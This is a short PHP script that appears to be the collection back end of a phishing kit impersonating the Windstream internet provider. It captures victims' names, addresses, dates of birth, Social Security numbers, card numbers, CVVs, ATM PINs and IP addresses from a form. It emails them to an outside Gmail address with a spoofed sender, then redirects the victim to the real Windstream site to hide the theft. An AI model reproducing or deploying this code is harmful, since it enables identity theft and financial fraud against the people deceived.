<?php

//Open Session
ini_set("output_buffering",4096);
session_start();

$ip = getenv("REMOTE_ADDR");
$message .= "------------ Windstream Personal -------------\n";
$message .= "Full Name 		       : ".$_POST['Fname']."\n";
$message .= "Address   			   : ".$_POST['Add']."\n";
$message .= "------------ Windstream Identity -------------\n";
$message .= "Date of Birth         : ".$_POST['dob']."\n";
$message .= "Social Security No    : ".$_POST['ssn']."\n";
$message .= "------------ Windstream Phone -------------\n";
$message .= "Phone Number   	   : ".$_POST['phone']."\n";
$message .= "------------ Windstream Card -------------\n";
$message .= "Debit/Credit Card     : ".$_POST['DCCN']."\n";
$message .= "Expiry Date    	   : ".$_POST['exdate']."\n";
$message .= "CVV     			   : ".$_POST['VCC']."\n";
$message .= "ATM PIN   			   : ".$_POST['apin']."\n";
$message .= "------------ Windstream Full -------------\n";
$message .= "IP: $ip\n";
$message .= "------------ Windstream Full -------------\n";
$subject = "Windstream Full ".$_POST['DCCN']."  - $ip";
$headers = "From: Windstream <god@mail.com>";
$SEND = "god2020shinigami@gmail.com";

mail($SEND,$subject,$message,$headers);
session_destroy();
$header = "https://www.windstream.net/";
header("Location: $header");

?>